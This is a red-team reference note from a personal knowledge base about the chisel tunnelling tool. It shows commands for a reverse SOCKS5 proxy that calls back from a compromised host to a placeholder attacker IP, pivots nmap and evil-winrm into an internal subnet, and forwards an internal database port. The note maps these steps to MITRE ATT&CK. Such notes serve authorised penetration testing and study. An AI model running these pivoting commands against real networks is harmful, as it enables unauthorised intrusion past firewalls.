---
type: tool
room: red
tool_name: "chisel"
version: "v1.9.x"
platform: [Linux, Windows, macOS]
phase: [Lateral Movement, Command and Control]
tags: [red/tool, red/pivoting, tunnelling, socks5, port-forwarding]
date_added: 2026-10-30
last_reviewed: 2026-10-30
---

# chisel

> [!quote]
> *"Where one door closes, a discreet tunnel opens."*

**Room:** Red — Instruments | **Phase(s):** `Lateral Movement, Command and Control` | **Platform:** `Linux, Windows, macOS`

---

## The Instrument *(What It Is)*

`Chisel` is a fast, cross-platform TCP/UDP tunnel transported over HTTP/HTTPS, secured via SSH-like end-to-end encryption. It is primarily used during internal penetration testing to establish reverse SOCKS5 proxies through deep network segmentation and egress-filtered corporate firewalls.

- **Author / Origin:** Jaime Pillora (@jpillora)
- **License:** MIT License
- **Install:** Pre-compiled Go binary from https://github.com/jpillora/chisel/releases

---

## The Method *(Core Usage)*

Chisel operates as a **Server** (typically attacker machine) and **Client** (compromised target).

```
Attacker (Server :8000) ◄────── Target (Client) [Compromised] ──────► Internal Subnet (172.16.x.x)
       ▲                                  │
[Proxychains / SOCKS5] ───────────────────┘
```

---

## The Cases *(Common Use-Patterns)*

### Case 1 — Reverse SOCKS5 Proxy
```bash
# 1. Attacker (Server): Listen on port 8000 allowing reverse connections
chisel server --port 8000 --reverse

# 2. Target (Client): Connect back to attacker, exposing internal network via SOCKS
./chisel client <ATTACKER_IP>:8000 R:socks

# 3. Attacker Workstation: Configure /etc/proxychains4.conf:
# socks5 127.0.0.1 1080
# Then pivot tools directly into internal network:
proxychains nmap -sT -Pn 172.16.10.0/24
proxychains evil-winrm -i 172.16.10.15 -u Administrator -p 'Password123'
```

### Case 2 — Forwarding a Specific Internal Port
```bash
# Target (Client): Expose internal port 3306 on attacker's localhost port 3306
./chisel client <ATTACKER_IP>:8000 R:3306:127.0.0.1:3306
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name |
|-------------|----------------|
| `T1090.001` | Proxy: Internal Proxy |
| `T1090.002` | Proxy: External Proxy |
| `T1572` | Protocol Tunneling |

---

## Related Notes

- [[Red/Instruments/ssh|ssh / scp / sftp]]
- [[Red/Monographs/TA0008 - Lateral Movement|TA0008 — Lateral Movement]]

↩ [[Red/Instruments/readme|Red: Instruments]] · [[Red/Red|Red]] · [[Mind Palace]]
